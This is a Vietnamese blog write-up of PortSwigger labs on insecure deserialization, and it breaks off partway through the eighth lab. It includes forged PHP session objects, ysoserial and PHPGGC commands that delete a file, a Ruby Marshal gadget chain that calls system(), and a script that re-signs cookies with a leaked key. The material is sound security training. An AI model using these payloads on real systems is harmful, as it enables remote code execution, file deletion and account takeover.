---
title: 'Web11: Insecure deserialization'
tags: [web11]

---

I. Đặt vấn đề
-------------
![image.png](https://images.viblo.asia/a063ca42-3304-41a2-96ca-493aaf841bbb.png)

### 1\. Mở đầu về Serialization và Deserialization

Trong lập trình và ứng dụng phần mềm, chúng ta có thể sử dụng nhiều loại ngôn ngữ lập trình khác nhau, trong mỗi ngôn ngữ đó lại chứa các đối tượng và cấu trúc dữ liệu đa dạng. Với một lượng lớn thông tin dữ liệu với đặc điểm "không hề thống nhất" như vậy khiến chúng ta gặp nhiều khó khăn trong các quá trình lưu trữ, truyền tải và bảo mật dữ liệu. Đó là lý do thuật ngữ "Serialization" ra đời.

Kỹ thuật Serialize được sinh ra để giải quyết vấn đề thống nhất đó. Dưới đây là một số lợi ích của việc sử dụng Serialization:

-   Lưu trữ dữ liệu: Một trong những lợi ích quan trọng nhất của serialization là cho phép lưu trữ dữ liệu. Khi cần lưu trữ trạng thái của một đối tượng hoặc cấu trúc dữ liệu để sử dụng sau này, serialization cho phép chúng ta lưu trữ dữ liệu đó dưới dạng file hoặc cơ sở dữ liệu. Ví dụ, khi một ứng dụng đóng lại, serialization có thể được sử dụng để lưu trữ trạng thái của ứng dụng để có thể khôi phục lại khi ứng dụng được mở lại.
    
-   Truyền tải dữ liệu: Serialization cũng cho phép chuyển đổi đối tượng hoặc cấu trúc dữ liệu thành dạng có thể truyền tải qua mạng. Khi cần truyền tải dữ liệu từ một ứng dụng đến ứng dụng khác qua mạng, serialization giúp chúng ta chuyển đổi đối tượng hoặc cấu trúc dữ liệu thành dạng có thể truyền tải. Ví dụ, khi một ứng dụng phải gửi một đối tượng qua mạng tới một ứng dụng khác để xử lý, serialization có thể được sử dụng để chuyển đổi đối tượng thành một chuỗi byte nhằm phù hợp việc truyền tải.
    
-   Tương tác giữa các ngôn ngữ lập trình khác nhau: Serialization cho phép tương tác giữa các ngôn ngữ lập trình khác nhau. Khi các ứng dụng được phát triển bằng các ngôn ngữ lập trình khác nhau và cần truyền tải hoặc chia sẻ dữ liệu, serialization cho phép chuyển đổi dữ liệu sang dạng chung để có thể được sử dụng bởi tất cả các ứng dụng. Ví dụ, một ứng dụng được viết bằng Java có thể chuyển đổi đối tượng thành chuỗi byte và gửi nó đến ứng dụng được viết bằng Python hoặc C#.
    
-   Bảo mật dữ liệu: Serialization cho phép bảo mật dữ liệu. Khi dữ liệu được chuyển đổi sang dạng chuỗi byte, chúng ta có thể mã hóa nó để bảo mật dữ liệu.
    

Thông thường, dữ liệu bytes được chọn làm quy tắc chung nhằm mang lại hiệu quả tương tác tốt nhất với nguyên tắc I/O (Input/Output) trong quá trình lưu trữ và truyền tải dữ liệu.

Ngược lại với Serialize, kỹ thuật Deserialize giúp ứng dụng có thể chuyển các chuỗi byte đó trở lại thành đối tượng hoặc cấu trúc dữ liệu gốc.

Để hiểu rõ hơn về hai quá trình này, các bạn có thể hình dung công việc phải vận chuyển một tòa nhà từ vị trí này sang vị trí khác: **Serialization** là quá trình tháo dỡ tòa nhà thành từng viên gạch, và tạo ra một bản thiết kế thi công; Sau khi chuyển các viên gạch tới vị trí đích, quá trình **Deserialization** sẽ khôi phục lại tòa nhà từ bản thiết kế đó.

### 2\. Một số phương thức thực hiện Serialize - Deserialize

![image.png](https://images.viblo.asia/d8b2176b-fbe8-4011-ae23-4bbb429c39ce.png)

Về bản chất thì Serialization - Deseralization là quá trình "phân mảnh - tái tổ chức" một đối tượng nên không có một quy tắc chung để thực hiện nó. Chúng có thể được chia làm 3 3 hình thức chính sau: binary serialization, SOAP (Simple Object Access Protocol) serialization, và XML (Extensible Markup Language) serialization. Trong đó:

-   Binary Serialization là quá trình chuyển đổi các đối tượng trong bộ nhớ thành một chuỗi các byte. Chuỗi này có thể được sử dụng để lưu trữ hoặc truyền qua mạng. Binary Serialization là định dạng hiệu quả và nhanh nhất trong số các phương pháp serialization, vì nó chỉ tạo ra một chuỗi byte duy nhất. Tuy nhiên, định dạng này có thể không tương thích giữa các nền tảng ngôn ngữ, công nghệ khác nhau hoặc các phiên bản khác nhau của chương trình.
    
-   SOAP (Simple Object Access Protocol) Serialization là một phương thức serialization được sử dụng trong web service để truyền tải các thông tin giữa các ứng dụng khác nhau. SOAP Serialization sử dụng định dạng XML để tạo ra các tin nhắn trao đổi giữa các ứng dụng. SOAP Serialization có thể được sử dụng để gửi các yêu cầu (requests) và nhận các phản hồi (responses) từ các dịch vụ web.
    
-   XML Serialization là quá trình chuyển đổi các đối tượng trong bộ nhớ thành một định dạng XML. Định dạng này có thể được sử dụng để lưu trữ hoặc truyền qua mạng. Với hình thức lưu trữ và truyền dưới dạng văn bản làm cho dữ liệu dễ đọc và tương thích giữa các nền tảng khác nhau. Tuy nhiên, định dạng này thường có độ phức tạp cao hơn và chậm hơn so với Binary Serialization.
    

Ngoài ra lập trình viên có thể tự định nghĩa cách thức chuyển đổi một đối tượng trong bộ nhớ thành một định dạng có thể lưu trữ hoặc truyền qua mạng. Điều này giúp họ điều khiển được các quá trình chuyển đổi dữ liệu, bao gồm cách mã hóa đối tượng và cách giải mã đối tượng. Cách làm này thường được gọi là Custom Serialization.

### 3\. Lỗ hổng Insecure deserialization

Lỗ hổng Insecure deserialization xảy ra khi kẻ tấn công có thể chỉnh sửa, thay đổi các đối tượng, dữ liệu sẽ được thực hiện Deserialize bởi ứng dụng. Họ có thể tận dụng các object sẵn có của ứng dụng, tạo ra các quá trình deserialization theo mục đích riêng, thậm chí có thể dẫn đến tấn công thực thi mã từ xa (RCE). Tấn công deserialization cũng được gọi với cái tên khác là **Object injection**.

![image.png](https://images.viblo.asia/8760c903-d212-4ffd-9aab-c7a2954d017b.png)

II. Các bài lab
-------------

# **1. Lab: Modifying serialized objects**
>This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user `carlos`.
You can log in to your own account using the following credentials: `wiener:peter`
![image](https://hackmd.io/_uploads/SJQQ7i88R.png)

>Đăng nhập vào `wiener`, thấy rằng trong session có `%3d`, đây là biểu hiện của URL-encode:
>![image](https://hackmd.io/_uploads/BJMDQsL8R.png)

>Thử URL-decode thì ta lại nhận được chuỗi mới, kết thúc bằng kí tự `=`, là dấu hiệu của Base64-encode: ![image](https://hackmd.io/_uploads/HJHzNoIIC.png)

>Tiếp tục decode Base64, ta sẽ nhận được 1 chuỗi object `User` sau khi được serialized: 
>![image](https://hackmd.io/_uploads/SkxEEs8LC.png)
`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}`

>Từ đây biết rằng server sử dụng kỹ thuật serialization để mã hóa session, lớp **`User()`** có dạng:

```php=
class User {
    public $username;
    public $admin;
}
```

>Để ý object `User()` này có thuộc tính `admin` hiện có giá trị boolean 0 tức là `false`. Khi cố truy cập vào `/admin` thì sẽ bị chặn do user `wiener` không phải là admin: ![image](https://hackmd.io/_uploads/rJtXHoIUA.png)
>![image](https://hackmd.io/_uploads/rkN8IoII0.png)


>Ta sẽ tiến hành thay đổi giá trị cho thuộc tính `admin` từ 0 thánh 1 (true) và tiến hành encode lại chuỗi theo đúng trình tự ngược lại với quá trình giải mã. Kết quả thu được chuỗi đã sửa đổi: `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D`

>Thay session mới vào và thành công truy cập được đường dẫn `/admin`: ![image](https://hackmd.io/_uploads/SyauLoLUC.png)

>Lấy đường dẫn ứng với xóa người dùng `carlos`: ![image](https://hackmd.io/_uploads/ByKjIjL80.png)

>Send request xóa `carlos`: ![image](https://hackmd.io/_uploads/SyMTLo88A.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/ryeCIo88C.png)

# **2. Lab: Modifying serialized data types**
>This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the `administrator` account. Then, delete the user `carlos`.
You can log in to your own account using the following credentials: `wiener:peter`
![image](https://hackmd.io/_uploads/ByJJ3sL8A.png)

>Đăng nhập vào tài khoản `wiener`, tiếp tục giống bài 1, Session sẽ lưu thông tin về Object `User()`: ![image](https://hackmd.io/_uploads/Byy7hoLLR.png)

>Theo quy trình URL-decode -> Base64-decode ta nhận được chuỗi: ![image](https://hackmd.io/_uploads/H1JL3oULA.png)
`O:4:"User":2{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"ap2mfwiby6t5can0ieclj4ny5uidyat7";}`

>Biết được rằng class User() có 2 thuộc tính là `username` và `access_token`. Lần này ứng dụng authenticate user thông qua thuộc tính `access_token` là chuỗi kí tự dài 32 kí tự.

>Tuy nhiên, theo mô tả có thể ứng dụng này sử dụng PHP loose comparison bởi operator == để authenticate như sau:
```
$user = unserialize($_SESSION)
if ($user['access_token'] == $access_token) {
// Authenticate successfully
}
```

>Như vậy ta sẽ bypass bằng cách chỉnh `access_token` về số nguyên 0 => bypass được `==` vì `0 == "string"` sẽ trả về `true`. Serialized object sau khi chỉnh như sau:

`O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}`

>Tiến hành Base64-encode rồi URL-encode chuỗi trên, ta được chuỗi cuối cùng: `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ%3D%3D`

>Thay chuỗi này vào session: ![image](https://hackmd.io/_uploads/Hk1KAoL8R.png)

>Tải lại trang và thành công truy cập được vào `/admin`: ![image](https://hackmd.io/_uploads/rJDqAo8LC.png)

>Xóa người dùng `carlos`:
> ![image](https://hackmd.io/_uploads/r1Rj0iL8R.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/S1ZpCj8IC.png)

# **3. Lab: Using application functionality to exploit [insecure deserialization](https://portswigger.net/web-security/deserialization)**
>This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory.
You can log in to your own account using the following credentials: `wiener:peter`
You also have access to a backup account: `gregg:rosebud`
![image](https://hackmd.io/_uploads/Bkfk8nILC.png)

>Đăng nhập vào `wiener`, tại `/my-account` có chức năng **Delete User** và **Upload Avatar**: ![image](https://hackmd.io/_uploads/S1-2D3I8R.png)

>Thử thay đổi avatar và xem request nhưng có vẻ không khai thác được gì: ![image](https://hackmd.io/_uploads/ry-79388R.png)

>Ứng dụng chứa session cookie là 1 serialized `User` object. Một điểm để ý ở đây là có chứa thuộc tính `avatar_link` và đường link dẫn đến avatar của user: ![image](https://hackmd.io/_uploads/H13_qnIUR.png)
`O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vsncypkdbh2ajb6g4e6en7705bhnjyu4";s:11:"avatar_link";s:19:"users/wiener/avatar";}`

>Như vậy, ta có thể đoán rằng, khi Delete account, avatar của user cũng bị delete -> nếu ta thay đổi đường dẫn tại thuộc tính `avatar_link` thành 1 file bất kì trong hệ thống thì file đó sẽ bị delete khỏi hệ thống khi Delete account.

>Chỉnh sửa `avatar_link` thành chuỗi có 23 kí tự là đường dẫn ta cần xóa `/home/carlos/morale.txt`: 
>`O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"vsncypkdbh2ajb6g4e6en7705bhnjyu4";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}`
>Lưu ý chỉnh sửa độ dài của `avatar_link` lên `23` kí tự khớp với đường dẫn ta tới file mà ta muốn xóa!

>Intercept chức năng **Delete account** và sửa session cookie như trên: ![image](https://hackmd.io/_uploads/HykFtpI80.png)

>Forward request sau khi chỉnh sửa và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/Sy35FT88A.png)

# **4. Lab: Arbitrary object injection in PHP**
>This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.
You can log in to your own account using the following credentials: `wiener:peter`

>![image](https://hackmd.io/_uploads/HkE8qa8IA.png)

>Truy cập lab, đọc source code thì thấy phần comment để lộ 1 file `CustomTemplate.php`
>![image](https://hackmd.io/_uploads/rJkoa688C.png)

>Khi truy cập vào file này thì không trả về 1 kết quả gì: ![image](https://hackmd.io/_uploads/BJkxAaIU0.png)

>Tuy nhiên ile backup **`CustomTemplate.php~`** chưa bị xóa nên chúng ta có thể đọc được nội dung file:
![image](https://hackmd.io/_uploads/ryiZ0aLIA.png)

>Nội dung file này như sau:
```
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```

>Đọc source code, ta có thể biết thêm rằng một class `CustomTemplate` được định nghĩa với 2 thuộc tính `template_file_path` và `lock_file_path`. Ta chỉ cần quan tâm magic method `__destruct()` khi nó thực hiện xóa file tại `lock_file_path` nếu nó tồn tại. Mặt khác `__destruct()` sẽ được gọi là server thực hiện deserialize.

>→ Ta có thể tận dụng session cookie để thực hiện Object Injection như sau:

`O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`

>Server sẽ thực hiện deserialize CustomTemplate object trên => hàm `__destruct()` được kích hoạt => file `/home/carlos/morale.txt` bị xóa.

>Payload: `TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D`
 
> Gửi request với session cookie mới. Mặc dù server trả 500 vì invalid user nhưng payload trên đã được deserialize: ![image](https://hackmd.io/_uploads/S1F9JA8UR.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/SkJp1088A.png)

# **5. Lab: Exploiting Java deserialization with Apache Commons**
>This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.
To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.
You can log in to your own account using the following credentials: `wiener:peter`
![image](https://hackmd.io/_uploads/H1jSdovL0.png)

>Đăng nhập vào `wiener`, tiếp tục ở `Session` lại được URL-encode, ta sẽ giải mã nó ra xem được gì: ![image](https://hackmd.io/_uploads/ByqopjDU0.png)

>Lần này, lab đã không sử dụng ngôn ngữ PHP để serialized nữa, mà sử dụng Java (đặc trưng bằng việc bắt đầu bằng `ac ed`). 

>Ở bài này ta sẽ thực hiện tấn công bằng cách tạo 1 gadget chain bằng tool **ysoserial**.

>Để kiểm tra trang web có chứa lỗ hổng Deserialization tại vị trí session hay không, chúng ta có thể sử dụng gadget **URLDNS** trong bộ tool **ysoserial** thực hiện DNS lookup. Payload:
>`java --add-opens java.base/java.net=ALL-UNNAMED -jar ysoserial-all.jar URLDNS "http://vutn6tye6vxgslalb5a6ukzer5xwls9h.oastify.com" 2> /dev/null | base64 -w0
"
`
![image](https://hackmd.io/_uploads/B12SonDLR.png)

>Trong đó **`http://vutn6tye6vxgslalb5a6ukzer5xwls9h.oastify.com`** được sinh bởi Collaborator của Burp Suite , mã hóa payload với **Base64** và tùy chọn **`-w0`** loại bỏ ký tự xuống dòng của payload.

>Tiếp theo, thay chuỗi thu được vào session trong cookie, lưu ý cần mã hóa URL-encode trước khi send request!
>![image](https://hackmd.io/_uploads/S1N2i3vUA.png)
![image](https://hackmd.io/_uploads/SkyConPUR.png)

>Sau khi gửi request với chuỗi trên, server Collaborator nhận được request đến, chứng tỏ tại vị trí session của trang web có thể bị khai thác lỗ hổng Deserialization: ![image](https://hackmd.io/_uploads/H1Eg3nDL0.png)

>Do mô tả nói ứng dụng sử dụng thư viện **Apache Commons Collections**, nên ta sẽ tạo payload dựa vào các chain sẵn có của thư viện này: CommonsCollections1, CommonsCollections2, …
>![image](https://hackmd.io/_uploads/SyUc22PL0.png)

> Thử lần lượt các chain thì CommonsCollections4 thành công nên ta sẽ sử dụng nó ở các bước tiếp theo. Payload: 
> `java -jar ysoserial-all.jar  CommonsCollections4 'rm /home/carlos/morale.txt' | base64`
> ![image](https://hackmd.io/_uploads/H1qEIaPIR.png)

>URL-decode gadget và thay chuỗi vừa nhận được vào làm giá trị trong `Session`: ![image](https://hackmd.io/_uploads/HyQdU6PIR.png)

>Mặc dù server trả lỗi **500 Internal Server Error** nhưng lệnh vẫn được thực thi, hoàn thành bài lab: ![image](https://hackmd.io/_uploads/BJAqIpv8C.png)

# **6. Lab: Exploiting Ruby [deserialization](https://portswigger.net/web-security/deserialization) using a documented gadget chain**
>This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.
To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.
You can log in to your own account using the following credentials: `wiener:peter`
![image](https://hackmd.io/_uploads/ryDdF6wIA.png)

>Ứng dụng sử dụng session cookie là 1 serialized object:
>![image](https://hackmd.io/_uploads/rylGn6wL0.png)

> Tiến hành giải mã cookie này: ![image](https://hackmd.io/_uploads/ryZx3TvI0.png)

>Từ những bytes đầu tiên `(04 08)`, ta có thể biết được đây là đặc trưng serialized của ngôn ngữ Ruby bằng module **marshal**.

>Tra google, ta tìm được 1 blog **Universal Deserialisation Gadget for Ruby 2.x-3.x** `https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html` nói về lỗ hổng insecure deserialization dẫn đến RCE và kèm theo code generate gadget chain cho mình.

>Đoạn code để gen gadget chain: 
```
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

require "base64"
puts Base64.encode64(payload)
```

>Compile code này (có thể bằng trình duyệt online) và thay target: `rm /home/carlos/morale.txt`, run code: ![image](https://hackmd.io/_uploads/HJke6avUR.png)

>Kết quả ta nhận lại được 1 gadget chain dạng base64: 
>`BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==`

>Thay chuỗi này vào trường `Session` và send: ![image](https://hackmd.io/_uploads/HyNNa6P8R.png)

>Mặc dù server trả lỗi **500 Internal Server Error** nhưng lệnh vẫn được thực thi, hoàn thành bài lab: ![image](https://hackmd.io/_uploads/S1DH6avU0.png)

# **7. Lab: Exploiting PHP deserialization with a pre-built gadget chain**
>This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's [insecure deserialization](https://portswigger.net/web-security/deserialization) using pre-built gadget chains.
To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the `morale.txt` file from Carlos's home directory.
You can log in to your own account using the following credentials: `wiener:peter`
![image](https://hackmd.io/_uploads/B1qbyx_I0.png)

>Đăng nhập vào tài khoản `wiener`, lần này thì session sẽ lưu thông tin về Object được serialized theo ngôn ngữ PHP: ![image](https://hackmd.io/_uploads/HJpplxdIA.png)

>Giải mã bằng Decoder thì ra được 1 Object gồm 1 thuộc tính `token` và `sig_hmac_sha1`. Trong đó,  trường `sig_hmac_sha1` chính là signature để xác thực User object tại trường `token` có bị thay đổi khi truyền đi hay không: ![image](https://hackmd.io/_uploads/B11J2gdL0.png)


>Khi ta cố tình sửa `token=0` để thực hiện lỗi như lab 2, thì server đã nhận ra được Session đã bị sửa đổi và deny request: ![image](https://hackmd.io/_uploads/S1OSGlOUC.png)
![image](https://hackmd.io/_uploads/HkfIGed8A.png)

>Server trả về lỗi sai signature và có kèm theo version framework server sử dụng là `Symfony 4.3.6`: ![image](https://hackmd.io/_uploads/Skq6IgdUA.png)


>Bây giờ ta sẽ đi generate gadget chain liên quan đến `Symfony 4.3.6`. Tuy nhiên, như đã nói server sẽ verify serialized object tại trường `token` bằng `sig_hmac_sha1`. Vậy nên sau khi tạo gadget chain payload thì cũng phải sign lại bằng secret key nào đó của server.

>Đọc lại source code thì thấy 1 đoạn comment bị lộ chỉ đến 1 đường dẫn để debug: ![image](https://hackmd.io/_uploads/r19yQxO8R.png)

>Truy cập đường dẫn, nó dẫn ta tới 1 trang chứa các thông tin của server: ![image](https://hackmd.io/_uploads/HkTN7euIR.png)

>Tìm kiếm theo từ khóa "key", ta lấy được `SECRET_KEY` dùng để sign cho `token`: ![image](https://hackmd.io/_uploads/H1j-_g_UR.png)

>Ta sẽ sử dụng tool **"PHPGGC"** trên Kali để có thể generate payload phục vụ cho việc exploit: ![image](https://hackmd.io/_uploads/HkkP8gdIA.png)

>Tìm kiếm các chain liên quan tới `Symfony 4.3.6`
>![image](https://hackmd.io/_uploads/SyYiIedL0.png)

>Ta sẽ sử dụng `Symfony/RCE4` vì nó tương ứng với version `Symfony 4.3.6`!
>Command để gen payload: 
>`./phpggc Symfony/RCE4 system "rm /home/carlos/morale.txt" | base64 -w0`
>![image](https://hackmd.io/_uploads/BJE8lZ_LA.png)

>Tiếp theo, sign payload vừa tạo với `SECRET_KEY` tìm được và tạo ra session cookie mới, với sự hỗ trợ của đoạn code sau: 
```
<?php
$payload = "<generated_payload>";
$secret = "<phpinfo_secret_key>";
$sig_hmac_sha1 = hash_hmac("sha1", $payload, $secret);

$cookie = urlencode('{"token":"'.$payload.'","sig_hmac_sha1":"'.$sig_hmac_sha1.'"}');
print_r($cookie);
?>
```
![image](https://hackmd.io/_uploads/HyiuxW_IA.png)

>Trong đó, hàm `hash_hmac("sha1", $payload, $secret)` được sử dụng để sign payload.

>Thực thi code trên và lấy được 1 session cookie mới: ![image](https://hackmd.io/_uploads/S1sFxZOLR.png)

>Thay session mới vào trong request và send: ![image](https://hackmd.io/_uploads/H1j9l-dIA.png)

>Mặc dù server trả lỗi **500 Internal Server Error** nhưng lệnh vẫn được thực thi, hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rJOjxb_8A.png)

# **8. Lab: Developing a custom gadget chain for Java deserialization**
>This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab's [insecure deserialization](https://portswigger.net/web-security/deserialization) to obtain the administrator's password.
To solve the lab, gain access to the source code and use it to construct a gadget chain to obtain the administrator's password. Then, log in as the `administrator` and delete `carlos`.
You can log in to your own account using the following credentials: `wiener:peter`
Note that solving this lab requires basic familiarity with another topic that we've covered on the [Web Security Academy](https://portswigger.net/web-security).
>![image](https://hackmd.io/_uploads/r1rmL-dL0.png)

>Đăng nhập vào tài khoản `wiener`, thấy rằng ở lab này thì giá trị của session được serialized bằng Java (đặc trưng những bytes đầu `ac ed`):
>![image](https://hackmd.io/_uploads/rJ1ewbO8R.png)
>![image](https://hackmd.io/_uploads/SJR0UbuUC.png)

>Đọc source code thì thấy 1 đường dẫn bị lộ: ![image](https://hackmd.io/_uploads/r19mDZ_80.png)

>Truy cập vào đường dẫn `/backup/AccessTokenUser.java`: ![image](https://hackmd.io/_uploads/H1AHvZdIR.png)

>Source code: 
```
package data.session.token;

import java.io.Serializable;

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    public String getUsername()
    {
        return username;
    }

    public String getAccessToken()
    {
        return accessToken;
    }
}
```

>Ta lấy được file **`AccessTokenUser.java`** định nghĩa lớp **`AccessTokenUser()`** có hai thuộc tính **`username`** và **`accessToken`**. và phương thức này cho phép Deserialize

>Bên trong thư mục `/backup`, còn tồn tại 1 file `ProductTemplate.java` 
>![image](https://hackmd.io/_uploads/rykDOW_U0.png)

>Truy cập vào file này: ![image](https://hackmd.io/_uploads/SkuFdZ_8A.png)

>Source code: 
```
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

>File **`ProductTemplate.java`** nằm trong package **`data.productcatalog`**, định nghĩa lớp **`ProductTemplate()`** cho phép Deserialize, với các thuộc tính private **`id`**, **`product`**. Phương thức **`readObject()`** được ghi đè. Chúng ta có thể dự đoán trang web sử dụng hệ cở sở dữ liệu **PostgresSQL**:
> ![image](https://hackmd.io/_uploads/B1lg_o-OUA.png)

>Đặc biệt, nó không thực hiện xử lí input nhập vào, mà chèn thẳng vào câu lệnh SQL, điều này có thể dẫn tới việc khai thác SQL Injection: 
>![image](https://hackmd.io/_uploads/rJ-xhb_IR.png)

>Và giá trị biến **`id`** có thể được thay đổi được:
![image](https://hackmd.io/_uploads/SyHY6bu8C.png)

>Vì lớp **`ProductTemplate()`** cho phép Deserialize nên chúng ta có ý tưởng như sau: Tạo một đối tượng **`productTemplate`** thuộc lớp **`ProductTemplate`**, thay đổi thuộc tính **`id`** của đối tượng này thành payload nhằm khai thác lỗ hổng SQL injection. Serialize đối tượng **`productTemplate`** và thay giá trị vào session của người dùng. Khi trang web thực hiện Deserialize session này sẽ thực thi câu truy vấn đã bị chúng ta thay đổi.

>Đầu tiên, tạo một package với tên **`data.productcatalog`**, các file java của chúng ta sẽ đặt trong package này, vì nếu không tạo package hoặc đặt tên sai sẽ dẫn tới lỗi package không tồn tại.

>Chúng ta cần sử dụng tới lớp **`ProductTemplate`**, tạo file **`ProductTemplate.java`** chỉ cần giữ lại thuộc tính **`id`** và phương thức khởi tạo (constructor).
```
package data.productcatalog;

import java.io.Serializable;

public class ProductTemplate implements Serializable {
    private final String id;
    public ProductTemplate(String id) {
        this.id = id;
    }
}

```

>Tạo file **`Main.java`**, chúng ta sử dụng file này tạo payload. Trước hết, cần một hàm thực hiện Serialize:

```
public static void Ser(Object obj) throws IOException {
    FileOutputStream fileOutputStream = new FileOutputStream("test.txt");
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
    objectOutputStream.writeObject(obj);
    objectOutputStream.close();
}

```

 
>Một hàm thực hiện đọc dữ liệu kết quả Serialize, sau đó sử dụng mã hóa Base64 và mã hóa URL cho ra payload cuối cùng. Do dữ liệu cần đọc ở dạng bytes nên chúng ta dùng phương thức **`Files.readAllBytes()`**

```
public static void ReadAndOut() throws IOException {
    File file = new File("test.txt");
    byte[] bytes = Files.readAllBytes(file.toPath());
    String output = Base64.getEncoder().encodeToString(bytes);
    output = URLEncoder.encode(output, "UTF-8");
    System.out.println(output);
}

```

 

>Nội dung cuối cùng của file **Main.java**:

```
package data.productcatalog;

import java.io.*;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.util.Base64;

public class Main {
